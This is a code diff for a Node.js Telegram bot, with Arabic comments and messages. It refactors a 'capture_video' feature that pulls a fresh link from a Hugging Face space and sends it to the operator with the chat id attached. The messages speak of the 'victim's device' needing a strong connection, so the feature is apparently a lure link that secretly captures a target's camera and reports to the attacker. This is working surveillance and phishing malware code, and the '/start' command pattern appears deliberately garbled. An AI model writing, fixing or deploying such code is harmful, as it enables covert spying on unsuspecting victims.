@@ -1653,66 +1653,64 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-bot.on('callback_query', (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'capture_video') {
-        async function fetchNewLink() {
+// دالة لجلب الرابط الجديد من الصفحة
+async function fetchNewLink() {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
     try {
-        const response = await fetch(url, { method: "GET" });
+        const response = await fetch(url);
         const html = await response.text();
 
-        // استخدم DOMParser لتحليل HTML
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, "text/html");
 
-        // البحث عن كل الروابط
         const links = doc.querySelectorAll("a[href]");
 
         for (let a of links) {
-            const link = a.getAttribute("href");
+            let link = a.getAttribute("href");
 
-            // نفس شرط بايثون: ينتهي بـ /ca
+            // تحويل الرابط النسبي إلى رابط كامل
+            if (!link.startsWith("http")) {
+                link = url + link;
+            }
+
+            // نفس شرط بايثون
             if (link.endsWith("/ca")) {
-                return link; // نعيد أول رابط مطابق
+                return link;
             }
         }
 
         return null;
 
-    } catch (e) {
-        console.error("Error:", e);
+    } catch (err) {
+        console.error("Error fetching link:", err);
         return null;
     }
 }
 
-// عند الضغط على الزر
-async function onButtonClick(chatId) {
-    const fetchedLink = await fetchNewLink();
 
-    if (!fetchedLink) {
-        alert("لم يتم العثور على رابط ينتهي بـ /ca");
-        return;
-    }
 
-    const message =
-        "تم انشاء الرابط.\n" +
-        "ملاحظة: قم بتلقيم رابط جديد في كل مرة.\n" +
-        "ملاحظة: يجب أن يكون النت قوي في جهاز الضحية.\n" +
-        `${fetchedLink}?chatId=${chatId}`;
+// عند ضغط الزر
+bot.on('callback_query', async (callbackQuery) => {
+    const chatId = callbackQuery.message.chat.id;
+    const data = callbackQuery.data;
 
-    console.log("Final Message:", message);
-    // هنا ارسل الرسالة بالطريقة التي تستخدمها
-}
+    if (data === 'capture_video') {
 
-        if (message && message.trim() !== '') {
-            bot.sendMessage(chatId, message);
-        } else {
-            console.log('🚫 تم منع إرسال رسالة فارغة في callback_query.');
+        // نحصل على الرابط الجديد من الموقع
+        const newLink = await fetchNewLink();
+
+        if (!newLink) {
+            bot.sendMessage(chatId, "لم يتم العثور على رابط ينتهي بـ /ca");
+            return;
         }
+
+        // الرسالة بنفس صيغة كودك القديم
+        const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره
+ملاحظه بزم يكون النت قوي في جهاز الضحيه
+: ${newLink}?chatId=${chatId}`;
+
+        bot.sendMessage(chatId, message);
     }
 });
 
